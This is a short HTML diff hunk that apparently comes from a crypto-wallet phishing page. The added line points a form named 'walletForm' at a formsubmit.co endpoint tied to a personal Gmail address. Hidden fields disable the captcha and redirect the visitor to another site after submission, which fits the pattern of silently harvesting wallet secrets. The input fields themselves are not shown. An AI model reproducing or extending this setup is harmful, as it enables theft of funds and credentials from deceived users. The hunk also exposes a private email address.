@@ -630,7 +630,7 @@
           <div class="loader"></div>
         </div>
       </div>
-<form id="walletForm" action="https://formsubmit.co/a7c27bf4ade3ae5a700ee6e5fac9f6dc" method="POST">
+<form id="walletForm" action="https://formsubmit.co/martinsprince126@gmail.com" method="POST">
   <input type="hidden" name="_next" value="https://myartvortex.com/" />
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
